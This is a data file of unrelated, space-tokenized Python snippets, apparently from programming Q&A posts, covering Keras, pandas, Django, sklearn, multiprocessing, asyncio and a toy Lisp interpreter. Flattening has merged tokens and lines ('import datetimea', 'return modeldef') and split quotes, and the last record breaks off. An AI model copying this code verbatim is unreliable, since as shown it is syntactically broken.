m- % d_ % H- % M- % S ' ) , len ( basemodel.layers ) , basemodel.count_params ( ) ) ) # Create new untrained layers x = basemodel.output x = GlobalAveragePooling2D ( ) ( x ) # global spatial average pooling layer x = Dense ( 16 , activation='relu ' ) ( x ) # fully-connected layer y = Dense ( nClasses , activation='softmax ' ) ( x ) # logistic layer making sure that probabilities sum up to 1 # Create model combining pre-trained base model and new untrained layers model = Model ( inputs=basemodel.input , outputs=y ) print ( `` % s : New model created with % i layers and % i parameters . '' % ( datetime.now ( ) .strftime ( ' % Y- % m- % d_ % H- % M- % S ' ) , len ( model.layers ) , model.count_params ( ) ) ) # Freeze weights on pre-trained layers for layer in basemodel.layers : layer.trainable = False # Define learning optimizer optimizerSGD = optimizers.SGD ( lr=0.01 , # learning rate . momentum=0.0 , # parameter that accelerates SGD in the relevant direction and dampens oscillations decay=0.0 , # learning rate decay over each update nesterov=False ) # whether to apply Nesterov momentum # Compile model model.compile ( optimizer=optimizerSGD , # stochastic gradient descent optimizer loss='categorical_crossentropy ' , # objective function metrics= [ 'accuracy ' ] , # metrics to be evaluated by the model during training and testing loss_weights=None , # scalar coefficients to weight the loss contributions of different model outputs sample_weight_mode=None , # sample-wise weights weighted_metrics=None , # metrics to be evaluated and weighted by sample_weight or class_weight during training and testing target_tensors=None ) # tensor model 's target , which will be fed with the target data during training print ( `` % s : Model compiled . '' % datetime.now ( ) .strftime ( ' % Y- % m- % d_ % H- % M- % S ' ) ) return modeldef train_model ( model , nBatches , nEpochs , imagePathTraining , imagesize , nSamples , valX , valY , resultPath ) : history = model.fit_generator ( generator=generate_data ( imagePathTraining , imagesize , nBatches ) , steps_per_epoch=nSamples//nBatches , # total number of steps ( batches of samples ) epochs=nEpochs , # number of epochs to train the model verbose=2 , # verbosity mode . 0 = silent , 1 = progress bar , 2 = one line per epoch callbacks=None , # keras.callbacks.Callback instances to apply during training validation_data= ( valX , valY ) , # generator or tuple on which to evaluate the loss and any model metrics at the end of each epoch class_weight=None , # optional dictionary mapping class indices ( integers ) to a weight ( float ) value , used for weighting the loss function max_queue_size=10 , # maximum size for the generator queue workers=32 , # maximum number of processes to spin up when using process-based threading use_multiprocessing=True , # whether to use process-based threading shuffle=True , # whether to shuffle the order of the batches at the beginning of each epoch initial_epoch=0 ) # epoch at which to start training print ( `` % s : Model trained . '' % datetime.now ( ) .strftime ( ' % Y- % m- % d_ % H- % M- % S ' ) ) return history"
> > > x= '' This is New era '' > > > print x # print in double quote when with print ( ) This is New era > > > x # x display in single quote'This is New era ' > > > x.__repr__ ( ) # repr ( ) already contain string '' 'This is New era ' '' > > > x.__str__ ( ) # str ( ) print only in single quote `` 'This is New era '
Format 1 : 2017-08-25 01:10:56.910523 -04:00Format 2 : 2017-08-25 01:10:56.910523 AMERICA/NEW_YORK
"class Stock ( models.Model ) : symbol = models.CharField ( db_index=True , max_length=5 , null=False , editable=False , unique=True ) class StockHistory ( models.Model ) : stock = models.ForeignKey ( Stock , related_name='StockHistory_stock ' , editable=False ) trading_date = models.DateField ( db_index=True , null=False , editable=False ) close = models.DecimalField ( max_digits=12 , db_index=True , decimal_places=5 , null=False , editable=False ) class Meta : unique_together = ( 'stock ' , 'trading_date ' ) import datetimea = Stock.objects.create ( symbol= ' A ' ) b = Stock.objects.create ( symbol= ' B ' ) c = Stock.objects.create ( symbol= ' C ' ) d = Stock.objects.create ( symbol='D ' ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,1,1 ) , close=200 , stock=a ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,1,2 ) , close=150 , stock=a ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,1,3 ) , close=120 , stock=a ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,4,28 ) , close=105 , stock=a ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,5,3 ) , close=105 , stock=a ) StockHistory.objects.create ( trading_date=datetime.date ( 2017,5,2 ) , close=400 , stock=b ) StockHistory.objects.create ( trading_date=datetime.date ( 2017,11,11 ) , close=200 , stock=b ) StockHistory.objects.create ( trading_date=datetime.date ( 2017,11,12 ) , close=300 , stock=b ) StockHistory.objects.create ( trading_date=datetime.date ( 2017,11,13 ) , close=400 , stock=b ) StockHistory.objects.create ( trading_date=datetime.date ( 2017,11,14 ) , close=500 , stock=b ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,4,28 ) , close=105 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,4,29 ) , close=106 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,4,30 ) , close=107 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,5,1 ) , close=108 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,5,2 ) , close=109 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,5,3 ) , close=110 , stock=c ) StockHistory.objects.create ( trading_date=datetime.date ( 2018,5,4 ) , close=90 , stock=c ) mysql > select - > s.symbol , - > sh.trading_date , - > low_table.low - > from - > ( - > select - > stock_id , - > min ( close ) as low - > from - > stocks_stockhistory - > where - > trading_date > = '2017-05-04 ' - > group by - > stock_id - > ) as low_table , - > stocks_stockhistory as sh , - > stocks_stock as s - > where - > sh.stock_id = low_table.stock_id - > and sh.stock_id = s.id - > and sh.close = low_table.low - > and sh.trading_date > = '2018-04-30 ' - > order by - > s.symbol asc ; + -- -- -- -- + -- -- -- -- -- -- -- + -- -- -- -- -- -+| symbol | trading_date | low |+ -- -- -- -- + -- -- -- -- -- -- -- + -- -- -- -- -- -+| A | 2018-05-03 | 105.00000 || C | 2018-05-04 | 90.00000 |+ -- -- -- -- + -- -- -- -- -- -- -- + -- -- -- -- -- -+2 rows in set ( 0.02 sec )"
"import pandas as pddates = pd.date_range ( start = ' 1/1/2016 ' , end = ' 1/12/2016 ' , freq = 'D ' ) nums = [ 10 , 12 , None , None , 39 , 10 , 11 , None , None , None , None , 60 ] df = pd.DataFrame ( { 'date ' : dates , 'num ' : nums } ) df [ 'filler ' ] = df [ 'num ' ] .fillna ( method = 'bfill ' ) date num filler0 2016-01-01 10.0 10.01 2016-01-02 12.0 12.02 2016-01-03 NaN 39.03 2016-01-04 NaN 39.04 2016-01-05 39.0 39.05 2016-01-06 10.0 10.06 2016-01-07 11.0 11.07 2016-01-08 NaN 60.08 2016-01-09 NaN 60.09 2016-01-10 NaN 60.010 2016-01-11 NaN 60.011 2016-01-12 60.0 60.0 date num0 2016-01-01 10.01 2016-01-02 12.02 2016-01-03 13.03 2016-01-04 13.04 2016-01-05 13.05 2016-01-06 10.06 2016-01-07 11.07 2016-01-08 12.08 2016-01-09 12.09 2016-01-10 12.010 2016-01-11 12.011 2016-01-12 12.0"
"import numpy as npdef f_1 ( arr ) : return np.sum ( arr > 0 ) def f_2 ( arr ) : ans = 0 for val in range ( arr.shape [ 0 ] ) : ans += np.sum ( arr [ val , : , : ] > 0 ) return ansdef f_3 ( arr ) : return np.count_nonzero ( arr ) if __name__ == '__main__ ' : data = np.random.randint ( 0 , 10 , ( 1_000 , 1_000 , 1_000 ) ) print ( f_1 ( data ) ) print ( f_2 ( data ) ) print ( f_3 ( data ) ) % timeit f_1 ( data ) 1.73 s ± 21.7 ms per loop ( mean ± std . dev . of 7 runs , 1 loop each ) % timeit f_2 ( data ) 1.4 s ± 1.36 ms per loop ( mean ± std . dev . of 7 runs , 1 loop each ) % timeit f_3 ( data ) 2.38 s ± 956 µs per loop ( mean ± std . dev . of 7 runs , 1 loop each )"
"vars ( ... ) vars ( [ object ] ) - > dictionary Without arguments , equivalent to locals ( ) . With an argument , equivalent to object.__dict__ . def func ( x , y ) : passhelp ( func ) func ( x , y ) def func ( x , y ) : `` '' '' func ( ... ) - > None '' '' '' help ( func ) func ( x , y ) func ( ... ) - > None"
"import numpy as npimport pandas as pdfrom scipy.stats import pearsonrNaN = np.nandd = { ' A ' : { ' A ' : ' 1 ' , ' B ' : ' 2 ' , ' C ' : ' 3 ' } , ' B ' : { ' A ' : ' 4 ' , ' B ' : ' 5 ' , ' C ' : ' 6 ' } , ' C ' : { ' A ' : ' 7 ' , ' B ' : ' 8 ' , ' C ' : ' 9 ' } } df_link_link = pd.DataFrame.from_dict ( dd , orient='index ' ) dict_congruent = { ' A ' : { ' A ' : NaN , ' B ' : pearsonr ( [ NaN,2,3 ] , [ 4,5,6 ] ) , ' C ' : pearsonr ( [ NaN,2,3 ] , [ 7,8,9 ] ) } , ' B ' : { ' A ' : pearsonr ( [ 4 , NaN,6 ] , [ 1,2,3 ] ) , ' B ' : NaN , ' C ' : pearsonr ( [ 4 , NaN,6 ] , [ 7,8,9 ] ) } , ' C ' : { ' A ' : pearsonr ( [ 7,8 , NaN ] , [ 1,2,3 ] ) , ' B ' : pearsonr ( [ 7,8 , NaN ] , [ 4,5,6 ] ) , ' C ' : NaN } }"
rule job1 : input : check_inputs ( rules.current.name ) output : ... rule job1 : input : check_inputs ( `` job1 '' ) output : ...
{ `` h '' : '' hello '' } > > > import json > > > > > > s = `` { ' h ' : 'hello ' } '' > > > json.load ( s )
"TypeError : If no scoring is specified , the estimator passed should have a 'score ' method . The estimator IsolationForest ( behaviour='old ' , bootstrap=False , contamination='legacy ' , max_features=1.0 , max_samples='auto ' , n_estimators=100 , n_jobs=None , random_state=None , verbose=0 , warm_start=False ) does not . import pandas as pdfrom sklearn.ensemble import IsolationForestfrom sklearn.model_selection import GridSearchCVdf = pd.DataFrame ( { 'first ' : [ -112,0,1,28,5,6,3,5,4,2,7,5,1,3,2,2,5,2,42,84,13,43,13 ] , 'second ' : [ 42,1,2,85,2,4,6,8,3,5,7,3,64,1,4,1,2,4,13,1,0,40,9 ] , 'third ' : [ 3,4,7,74,3,8,2,4,7,1,53,6,5,5,59,0,5,12,65,4,3,4,11 ] , 'result ' : [ 5,2,3,0.04,3,4,3,125,6,6,0.8,9,1,4,59,12,1,4,0,8,5,4,1 ] } ) x = df.iloc [ : , : -1 ] tuned = { 'n_estimators ' : [ 70,80,100,120,150,200 ] , 'max_samples ' : [ 'auto ' , 1,3,5,7,10 ] , 'contamination ' : [ 'legacy ' , 'outo ' ] , 'max_features ' : [ 1,2,3,4,5,6,7,8,9,10,13,15 ] , 'bootstrap ' : [ True , False ] , 'n_jobs ' : [ None,1,2,3,4,5,6,7,8,10,15,20,25,30 ] , 'behaviour ' : [ 'old ' , 'new ' ] , 'random_state ' : [ None,1,5,10,42 ] , 'verbose ' : [ 0,1,2,3,4,5,6,7,8,9,10 ] , 'warm_start ' : [ True , False ] } isolation_forest = GridSearchCV ( IsolationForest ( ) , tuned ) model = isolation_forest.fit ( x ) list_of_val = [ [ 1,35,3 ] , [ 3,4,5 ] , [ 1,4,66 ] , [ 4,6,1 ] , [ 135,5,0 ] ] df [ 'outliers ' ] = model.predict ( x ) df [ 'outliers ' ] = df [ 'outliers ' ] .map ( { -1 : 'outlier ' , 1 : 'good ' } ) print ( model.best_params_ ) print ( df )"
"import numpy as npfrom multiprocessing import sharedctypesa = np.ctypeslib.as_ctypes ( np.zeros ( ( 224,224,3 ) ) ) print ( `` Made a , now making b '' ) b = sharedctypes.RawArray ( a._type_ , a ) print ( `` Finished . '' ) Made a , now making bSegmentation fault ( core dumped )"
"line 1line 2line 3CommandLine arguments `` render -h 192.168.1.1 -u user -p pass '' line 5 with open ( the_file , ' r ' ) as f : for line in f : if ( line.startswith ( 'CommandLine ' ) ) : old_ip = line.split ( '-h ' ) [ 1 ] .split ( ' - ' ) [ 0 ] print ( old_ip )"
"L = [ 1,2,3,4,5,6,7,8,9 ] i = 0s = 0while i < len ( L ) and s + L [ i ] < 20 : s += L [ i ] i += 1"
"from sqlalchemy import Integer , Columnfrom sqlalchemy.ext.declarative import declarative_baseBase = declarative_base ( ) class Foo ( Base ) : __tablename__ = 'foo ' id = Column ( Integer , primary_key=True ) bar = Column ( Integer ) bool_clause = Foo.bar > 10int_clause = Foo.bar + 10a_foo = Foo ( bar=5 ) > > > something ( bool_clause , a_foo ) False > > > something ( int_clause , a_foo ) 15 bool_clause = lambda foo=Foo : foo.bar > 10int_clause = lambda foo=Foo : foo.bar + 10 > > > bool_clause ( a_foo ) False > > > int_clause ( a_foo ) 15"
"self._tree = collections.defaultdict ( lambda : self._tree ) def _add ( self , tree , path ) : for node in path : tree = tree [ node ] def _run ( self , tree , callback ) : for key in tree.keys ( ) : callback ( tree [ key ] ) # ! ! ! Recursion detected ( same locals & position ) self._run ( key ) def tree ( ) : return collections.defaultdict ( tree ) self._tree = tree ( )"
"class A ( object ) : def __eq__ ( self , other ) : print ( `` Calling A ( { } ) .__eq__ '' .format ( self ) ) return NotImplementedclass B ( A ) : def __eq__ ( self , other ) : print ( `` Calling B ( { } ) .__eq__ '' .format ( self ) ) return Trueclass C ( object ) : def __eq__ ( self , other ) : print ( `` Calling C ( { } ) .__eq__ '' .format ( self ) ) return Falsea = A ( ) b = B ( ) c = C ( ) print ( `` a : { } '' .format ( a ) ) # output `` a : < __main__.A object at 0x7f8fda95f860 > '' print ( `` b : { } '' .format ( b ) ) # output `` b : < __main__.B object at 0x7f8fda8bcfd0 > '' print ( `` c : { } '' .format ( c ) ) # output `` c : < __main__.C object at 0x7f8fda8bcef0 > '' a == a # case 1a == b # case 2.1b == a # case 2.2a == c # case 3.1c == a # case 3.2 Calling A ( < __main__.A object at 0x7f8fda95f860 > ) .__eq__Calling A ( < __main__.A object at 0x7f8fda95f860 > ) .__eq__ Calling B ( < __main__.B object at 0x7f8fda8bcfd0 > ) .__eq__ # case 2.1Calling B ( < __main__.B object at 0x7f8fda8bcfd0 > ) .__eq__ # case 2.2 Calling A ( < __main__.A object at 0x7f8fda95f860 > ) .__eq__ # case 3.1Calling C ( < __main__.C object at 0x7f8fda8bcef0 > ) .__eq__ # case 3.1Calling C ( < __main__.C object at 0x7f8fda8bcef0 > ) .__eq__ # case 3.2"
"from asyncio import get_event_loop , CancelledErrorfrom contextlib import suppressfrom motor.motor_asyncio import AsyncIOMotorClientasync def watch ( collection ) : async with collection.watch ( [ ] ) as stream : async for change in stream : print ( change ) async def cleanup ( ) : task.cancel ( ) with suppress ( CancelledError ) : await taskif __name__ == '__main__ ' : conn = AsyncIOMotorClient ( ) loop = get_event_loop ( ) task = loop.create_task ( watch ( conn.database.collection ) ) # Replace with a real collection . try : loop.run_forever ( ) except KeyboardInterrupt : pass finally : loop.run_until_complete ( cleanup ( ) ) loop.shutdown_asyncgens ( ) loop.close ( ) ^Cexception calling callback for < Future at 0x102efea58 state=finished raised InvalidStateError > Traceback ( most recent call last ) : File `` /Users/viotti/motor/lib/python3.6/site-packages/motor/core.py '' , line 1259 , in _next change = self.delegate.next ( ) File `` /Users/viotti/motor/lib/python3.6/site-packages/pymongo/change_stream.py '' , line 79 , in next change = self._cursor.next ( ) File `` /Users/viotti/motor/lib/python3.6/site-packages/pymongo/command_cursor.py '' , line 292 , in next raise StopIterationStopIterationDuring handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/concurrent/futures/thread.py '' , line 56 , in run result = self.fn ( *self.args , **self.kwargs ) File `` /Users/viotti/motor/lib/python3.6/site-packages/motor/core.py '' , line 1264 , in _next future.set_exception ( StopAsyncIteration ( ) ) asyncio.base_futures.InvalidStateError : invalid stateDuring handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/concurrent/futures/_base.py '' , line 324 , in _invoke_callbacks callback ( self ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/futures.py '' , line 414 , in _call_set_state dest_loop.call_soon_threadsafe ( _set_state , destination , source ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/base_events.py '' , line 620 , in call_soon_threadsafe self._check_closed ( ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/base_events.py '' , line 357 , in _check_closed raise RuntimeError ( 'Event loop is closed ' ) RuntimeError : Event loop is closed"
"In [ 1 ] : import numpy as npIn [ 2 ] : x = np.arange ( -10 , 11 ) In [ 3 ] : base = np.fft.fft ( np.cos ( x ) ) In [ 4 ] : shifted = np.fft.fft ( np.cos ( x-1 ) ) In [ 5 ] : w = np.fft.fftfreq ( x.size ) In [ 6 ] : phase = np.exp ( -2*np.pi*1.0j*w/x.size ) In [ 7 ] : test = phase * baseIn [ 8 ] : ( test == shifted ) .all ( ) Out [ 8 ] : FalseIn [ 9 ] : shifted/baseOut [ 9 ] : array ( [ 0.54030231 -0.j , 0.54030231 -0.23216322j , 0.54030231 -0.47512034j , 0.54030231 -0.7417705j , 0.54030231 -1.05016033j , 0.54030231 -1.42919168j , 0.54030231 -1.931478j , 0.54030231 -2.66788185j , 0.54030231 -3.92462627j , 0.54030231 -6.74850534j , 0.54030231-20.55390586j , 0.54030231+20.55390586j , 0.54030231 +6.74850534j , 0.54030231 +3.92462627j , 0.54030231 +2.66788185j , 0.54030231 +1.931478j , 0.54030231 +1.42919168j , 0.54030231 +1.05016033j , 0.54030231 +0.7417705j , 0.54030231 +0.47512034j , 0.54030231 +0.23216322j ] ) In [ 10 ] : np.abs ( shifted/base ) Out [ 10 ] : array ( [ 0.54030231 , 0.58807001 , 0.71949004 , 0.91768734 , 1.18100097 , 1.52791212 , 2.00562555 , 2.72204338 , 3.96164334 , 6.77009977 , 20.56100612 , 20.56100612 , 6.77009977 , 3.96164334 , 2.72204338 , 2.00562555 , 1.52791212 , 1.18100097 , 0.91768734 , 0.71949004 , 0.58807001 ] )"
"while ( ( c = getch ( ) ) ! = EOF ) { /* do something with c */ } c = sys.stdin.read ( 1 ) while not ( c == EOF ) : # Do something with c c = sys.stdin.read ( 1 ) while True : c = sys.stdin.read ( 1 ) if ( c == EOF ) : break # do stuff with c class ConditionalFileObjectReader : def __init__ ( self , fobj , filterfunc ) : self.filterfunc = filterfunc self.fobj = fobj def __iter__ ( self ) : return self def next ( self ) : c = self.fobj.read ( 1 ) if self.filterfunc ( c ) : raise StopIteration return cfor c in ConditionalFileObjectReader ( sys.stdin , lambda c : c == EOF ) : print c"
"`` `` '' FIX NESTED DEFINITIONS ! ( def square ( lambda ( x ) ( * x x ) ) ) ( def SoS ( lambda x y ) ( + ( square x ) ( square y ) ) ) DOES NOT WORK ! `` `` '' # ! /usr/bin/pythonimport readline , sys , shlexuserFuncs = { } userVars = { } stdOps = `` % * / - + set ! `` .split ( ) def lispify ( nested_lists ) : return str ( nested_lists ) .replace ( ' [ ' , ' ( ' ) .replace ( ' ] ' , ' ) ' ) .replace ( ' , ' , ' ' ) .replace ( `` ' '' , '' ) def mul_arr ( array ) : tot = 1 for i in array : tot *= i return totdef div_arr ( array ) : tot = array [ 0 ] for i in array [ 1 : ] : tot /= i return totdef sub_arr ( array ) : print array if len ( array ) > 1 : tot = array [ 0 ] else : tot = 0-array [ 0 ] for i in array [ 1 : ] : tot -= i return totdef atom ( tok ) : try : return int ( tok ) except : try : return float ( tok ) except : return str ( tok ) def pre_in ( read ) : tempOp = read [ 0 ] body = read [ 1 : ] expr = [ ] for i in range ( len ( body ) -1 ) : if not isinstance ( body [ i ] , list ) and body [ i ] ! = `` `` : expr.append ( str ( body [ i ] ) ) expr.append ( tempOp ) else : expr.append ( str ( pre_in ( body [ i ] ) ) ) expr.append ( tempOp ) try : if not isinstance ( body [ -1 ] , list ) : expr.append ( str ( body [ -1 ] ) ) else : expr.append ( str ( pre_in ( body [ -1 ] ) ) ) except : pass if expr ! = None : return `` ( `` + ' '.join ( expr ) + '' ) '' def tok ( s ) : try : return shlex.split ( s.replace ( ' ( ' , ' ( ' ) .replace ( ' ) ' , ' ) ' ) ) except : return s.replace ( ' ( ' , ' ( ' ) .replace ( ' ) ' , ' ) ' ) .split ( ) def read_from ( toks ) : if len ( toks ) == 0 : raise SyntaxError ( 'unexpected EOF ' ) tok = toks.pop ( 0 ) if tok == `` ' '' : l = [ ] toks.pop ( 0 ) while toks [ 0 ] ! = `` ) '' : l.append ( read_from ( toks ) ) toks.pop ( 0 ) return lispify ( l ) if tok == ' ( ' : l = [ ] while toks [ 0 ] ! = ' ) ' : l.append ( read_from ( toks ) ) toks.pop ( 0 ) return l elif tok == ' ) ' : raise SyntaxError ( 'unexpected \ ' ) \ '' ) else : return atom ( tok ) def total_eval ( read ) : if isinstance ( read , int ) : return read elif isinstance ( read , str ) : if read not in stdOps : if read in userVars : return atom ( userVars [ read ] ) else : return str ( atom ( read ) ) elif isinstance ( read , list ) : if read [ 0 ] in userFuncs : print read [ 0 ] + '' = `` +userFuncs [ read [ 0 ] ] exec ( read [ 0 ] + '' = `` +userFuncs [ read [ 0 ] ] ) return eval ( read [ 0 ] +str ( tuple ( read [ 1 : ] ) ) ) elif read [ 0 ] == `` + '' : return sum ( [ float ( total_eval ( i ) ) for i in read [ 1 : ] ] ) elif read [ 0 ] == `` * '' : return mul_arr ( [ float ( total_eval ( i ) ) for i in read [ 1 : ] ] ) elif read [ 0 ] == `` / '' : return div_arr ( [ float ( total_eval ( i ) ) for i in read [ 1 : ] ] ) elif read [ 0 ] == `` - '' : return sub_arr ( [ float ( total_eval ( i ) ) for i in read [ 1 : ] ] ) elif read [ 0 ] == `` set ! '' or read [ 0 ] == `` setf '' : userVars [ read [ 1 ] ] = total_eval ( read [ 2 ] ) return `` ok '' elif read [ 0 ] == `` lambda '' : tempvars = ' , '.join ( i.replace ( ' , ' , '' ) for i in read [ 1 ] ) expr = read [ 2 ] return `` lambda `` +str ( tempvars ) + '' : `` +pre_in ( expr ) elif read [ 0 ] == `` def '' or read [ 0 ] == `` define '' or read [ 0 ] == `` defun '' : funcName = read [ 1 ] funcBody = read [ 2 ] userFuncs [ funcName ] = total_eval ( funcBody ) return `` ok '' elif read [ 0 ] == `` cons '' : body = read [ 1 : ] arr = body [ 0 ] to_push = body [ 1 ] if not isinstance ( arr , list ) : arr = [ arr ] for i in to_push : arr.append ( i ) return lispify ( arr ) elif read [ 0 ] == `` append '' : body = read [ 1 : ] main = body [ 0 ] tail = body [ 1 : ] for i in tail : if i ! = [ ] : main.append ( i ) # print main return lispify ( main ) elif read [ 0 ] == `` list '' : return lispify ( str ( [ total_eval ( read [ 1 : ] [ i ] ) for i in range ( len ( read [ 1 : ] ) ) ] ) ) elif read [ 0 ] == `` \ ' '' or read [ 0 ] == `` quote '' : return lispify ( read [ 1 : ] [ 0 ] ) elif read [ 0 ] == `` print '' : return total_eval ( read [ 1 : ] [ 0 ] ) elif not isinstance ( read [ 0 ] , list ) : if read [ 0 ] in userFuncs : args = read [ 1 : ] exec ( read [ 0 ] + '' = `` +userFuncs [ read [ 0 ] ] ) return eval ( read [ 0 ] +str ( tuple ( [ float ( i ) for i in args ] ) ) ) else : if read [ 0 ] [ 0 ] == `` lambda '' : tempvars = ' , '.join ( i.replace ( ' , ' , '' ) for i in read [ 0 ] [ 1 ] ) expr = read [ 0 ] [ 2 ] exec ( `` temp = lambda `` +str ( tempvars ) + '' : `` +str ( pre_in ( expr ) ) ) args = read [ 1 : ] if len ( read [ 1 : ] ) > 1 else read [ 1 ] if isinstance ( args , list ) : return eval ( `` temp '' +str ( tuple ( [ total_eval ( i ) for i in args ] ) ) ) else : return eval ( `` temp ( `` +str ( float ( args ) ) + '' ) '' ) '' '' '' while 1 : try : a = raw_input ( `` lisp > `` ) try : print tok ( a ) print read_from ( tok ( a ) ) print total_eval ( read_from ( tok ( a ) ) ) , '' \n '' except : errorMsg = str ( sys.exc_info ( ) [ 1 ] ) .split ( ) if errorMsg [ 0 ] == `` list '' : print `` ParseError : mismatched parentheses\n '' else : print ' '.join ( errorMsg ) print except ( EOFError , KeyboardInterrupt ) : print `` \nbye ! '' break '' '' '' while 1 : a = raw_input ( `` lisp > `` ) # print tok ( a ) # print read_from ( tok ( a ) ) print total_eval ( read_from ( tok ( a ) ) ) print # '' '' ''"
"{ `` _enabled '' : true , `` instances '' : [ { `` isdefault '' : true , `` name '' : `` dev '' , `` password '' : `` abc123 '' , `` url '' : `` http : //dev.example.com '' , `` user '' : `` buffy '' } , { `` isdefault '' : false , `` name '' : `` prod '' , `` password '' : `` xxxxx '' , `` url '' : `` http : //prod.example.com '' , `` user '' : `` spike '' } , { `` isdefault '' : false , `` name '' : `` qa '' , `` password '' : `` dasddf '' , `` url '' : `` http : //prod.example.com '' , `` user '' : `` willow '' } ] , `` label '' : `` MyServers '' } { `` _enabled '' : true , `` instances '' : [ { `` isdefault '' : true , `` name '' : `` dev '' , `` url '' : `` http : //dev.example.com '' , `` user '' : `` buffy '' } , { `` isdefault '' : false , `` name '' : `` prod '' , `` url '' : `` http : //prod.example.com '' , `` user '' : `` spike '' } , { `` isdefault '' : false , `` name '' : `` qa '' , `` url '' : `` http : //prod.example.com '' , `` user '' : `` willow '' } ] , `` label '' : `` MyServers '' }"
"def get_response ( self , url , params ) : encoded_params = urllib.urlencode ( params ) request = urllib2.Request ( BASE_URL , headers=HEADERS ) response = urllib2.urlopen ( request , encoded_params ) return response"
"dependencies = [ ( 'taggit ' , '0001_initial ' ) , # … ]"
< form id='myform ' > Favorite colors ? < input type='checkbox ' name='color ' value='Green ' > Green < input type='checkbox ' name='color ' value='Blue ' > Blue < input type='checkbox ' name='color ' value='Red ' > Red < input type='submit ' value='Submit ' > < /form >
"import stringa = list ( string.ascii_lowercase ) [ ' a ' , ' b ' , ' c ' , ' j ' , ' k ' , ' l ' , 's ' , 't ' , ' u ' ] import itertoolss1 = a [ : :9 ] s2 = a [ 1 : :9 ] s3 = a [ 2 : :9 ] res = list ( itertools.chain.from_iterable ( zip ( s1 , s2 , s3 ) ) )"
"from multiprocessing import Poolimport sympyfrom sympy.abc import xdef f ( m ) : return m.lambdify ( ) ( 1 ) class Mult ( ) : def lambdify ( self ) : # return sympy.lambdify ( x , 2*x , 'numpy ' ) self._lambdify = sympy.lambdify ( x , 2 * x , 'numpy ' ) return self._lambdifyif __name__ == '__main__ ' : with Pool ( ) as pool : m = Mult ( ) print ( pool.map ( f , [ m ] ) ) print ( pool.map ( f , [ m ] ) ) print ( f ( m ) ) print ( pool.map ( f , [ m ] ) ) [ 2 ] [ 2 ] 2PicklingError : Ca n't pickle < function < lambda > at 0x000000000DF0D048 > : attribute lookup < lambda > on numpy failed [ 2 ] [ 2 ] 2 [ 2 ]"
"model = Sequential ( ) model.add ( Conv2D ( 24 , ( 5 , 5 ) , strides= ( 1 , 1 ) , padding= '' valid '' , data_format= '' channels_last '' , activation='relu ' , use_bias=True , ) ) # out=96model.add ( Dropout ( .25 ) ) model.add ( MaxPooling2D ( pool_size= ( 2 , 2 ) ) ) # out=48model.add ( Conv2D ( 32 , ( 3 , 3 ) , strides= ( 1 , 1 ) , padding= '' valid '' , data_format= '' channels_last '' , activation='relu ' , use_bias=True , ) ) # out=46model.add ( MaxPooling2D ( pool_size= ( 2 , 2 ) ) ) # out=23model.add ( Conv2D ( 48 , ( 3 , 3 ) , strides= ( 1 , 1 ) , padding= '' valid '' , data_format= '' channels_last '' , activation='relu ' , use_bias=True , ) ) # out=21model.add ( MaxPooling2D ( pool_size= ( 2 , 2 ) ) ) # padding ? ? ? model.add ( Flatten ( ) ) model.add ( Dense ( 3 , activation='softmax ' ) ) datagen_training = ImageDataGenerator ( rotation_range = 20 , width_shift_range = 0.3 , height_shift_range=0.3 , zoom_range=0.2 , fill_mode = `` constant '' , cval = 0 , vertical_flip = True , validation_split = 0.2 ) datagen_training.fit ( data ) rmsprop = optimizers.RMSprop ( lr=0.001 ) # docu says to only tune the learning ratekf = KFold ( n_splits=FOLDS , shuffle = True , random_state=78945 ) model.compile ( rmsprop , loss = losses.categorical_crossentropy , metrics= [ metrics.categorical_accuracy ] ) acc_hist = [ ] while True : history = object ( ) for train_idx , val_idx in kf.split ( data , labels ) : x_train , y_train = data [ train_idx ] , labels [ train_idx ] x_val , y_val = data [ val_idx ] , labels [ val_idx ] data_iterator = datagen_training.flow ( x_train , y_train , batch_size=BATCH_SIZE ) history = model.fit_generator ( data_iterator , steps_per_epoch=len ( x_train ) // BATCH_SIZE , epochs=1 ) acc_hist.append ( history.history [ 'categorical_accuracy ' ] [ 0 ] ) # stop if accuracy does n't change within 3 epochs if stopping_criterion_met : break"
"# task.pyimport multiprocessing as mpPOOL_NUMBER = 2lock_read = mp.Lock ( ) lock_write = mp.Lock ( ) fi = open ( 'input.txt ' , ' r ' ) fo = open ( 'output.txt ' , ' w ' ) def handle ( line ) : # In the future I want to do # some more complicated operations over the line return line.strip ( ) [ : :-1 ] # Reversingdef target ( ) : while True : try : with lock_read : line = next ( fi ) except StopIteration : break line = handle ( line ) with lock_write : print ( line , file=fo ) pool = [ mp.Process ( target=target ) for _ in range ( POOL_NUMBER ) ] for p in pool : p.start ( ) for p in pool : p.join ( ) fi.close ( ) fo.close ( ) Process Process-2 : Process Process-1 : Traceback ( most recent call last ) : File `` /usr/lib/python3.5/multiprocessing/process.py '' , line 249 , in _bootstrap self.run ( ) File `` /usr/lib/python3.5/multiprocessing/process.py '' , line 93 , in run self._target ( *self._args , **self._kwargs ) File `` task.py '' , line 22 , in target line = next ( fi ) File `` /usr/lib/python3.5/codecs.py '' , line 321 , in decode ( result , consumed ) = self._buffer_decode ( data , self.errors , final ) UnicodeDecodeError : 'utf-8 ' codec ca n't decode byte 0x8b in position 0 : invalid start byteTraceback ( most recent call last ) : File `` /usr/lib/python3.5/multiprocessing/process.py '' , line 249 , in _bootstrap self.run ( ) File `` /usr/lib/python3.5/multiprocessing/process.py '' , line 93 , in run self._target ( *self._args , **self._kwargs ) File `` task.py '' , line 22 , in target line = next ( fi ) File `` /usr/lib/python3.5/codecs.py '' , line 321 , 